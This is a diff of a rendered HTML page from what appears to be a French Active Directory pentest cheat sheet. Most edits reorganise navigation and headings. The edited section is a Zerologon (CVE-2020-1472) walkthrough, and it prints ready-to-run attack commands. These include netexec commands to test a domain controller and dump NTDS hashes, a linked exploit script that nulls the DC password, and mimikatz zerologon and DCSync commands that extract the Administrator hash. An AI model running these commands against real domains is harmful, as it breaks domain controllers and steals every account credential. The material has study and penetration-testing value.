@@ -5998,6 +5998,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Depuis Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#verifier-si-le-dc-est-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vérifier si le DC est vulnérable :
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-de-la-faille" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation de la faille :
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -6006,6 +6030,30 @@
       Depuis Windows
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Depuis Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lexploit-peut-se-faire-avec-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      L'exploit peut se faire avec mimikatz :
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puis-on-effectue-le-dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      Puis on effectue le DCSync :
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -7946,6 +7994,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Depuis Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#verifier-si-le-dc-est-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vérifier si le DC est vulnérable :
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-de-la-faille" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation de la faille :
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -7954,6 +8026,30 @@
       Depuis Windows
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Depuis Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lexploit-peut-se-faire-avec-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      L'exploit peut se faire avec mimikatz :
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puis-on-effectue-le-dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      Puis on effectue le DCSync :
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -7992,20 +8088,20 @@
 <h2 id="remplacer-le-hash-du-dc-par-un-hash-null">Remplacer le hash du DC par un hash null</h2>
 <p>Utilisation de <a href="https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py">https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py</a> :
 Cet exploit va remplacer le hash du DC par un hash null, le problème de cette méthode est donc que l'AD va vite devenir inutilisable :</p>
-<h4 id="depuis-linux">Depuis Linux</h4>
-<p>Vérifier si le DC est vulnérable :</p>
+<h3 id="depuis-linux">Depuis Linux</h3>
+<h4 id="verifier-si-le-dc-est-vulnerable">Vérifier si le DC est vulnérable :</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>zerologon
 </span></code></pre></div>
-<p>Exploitation de la faille :</p>
+<h4 id="exploitation-de-la-faille">Exploitation de la faille :</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>cve-2020-1472-exploit.py<span class="w"> </span><span class="s1">&#39;nomDuDC&#39;</span><span class="w"> </span><span class="s1">&#39;adresseIpDuDC&#39;</span>
 </span></code></pre></div>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;DC0$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--ntds
 </span></code></pre></div>
-<h4 id="depuis-windows">Depuis Windows</h4>
-<p>L'exploit peut se faire avec mimikatz :</p>
+<h3 id="depuis-windows">Depuis Windows</h3>
+<h4 id="lexploit-peut-se-faire-avec-mimikatz">L'exploit peut se faire avec mimikatz :</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>lsadump::zerologon<span class="w"> </span>/target:dc.domain.local<span class="w"> </span>/account:DC$<span class="w"> </span>/exploit
 </span></code></pre></div>
-<p>Puis on effectue le DCSync :</p>
+<h4 id="puis-on-effectue-le-dcsync">Puis on effectue le DCSync :</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>lsadump::dcsync<span class="w"> </span>/domain:domain.local<span class="w"> </span>/dc:dc.domain.local<span class="w"> </span>/user:Administrator<span class="w"> </span>/authuser:DC$<span class="w"> </span>/authdomain:domain<span class="w"> </span>/authpassword:<span class="s2">&quot;&quot;</span><span class="w"> </span>/authntlm
 </span></code></pre></div>
 <h3 id="relais-ntlm">Relais NTLM</h3>
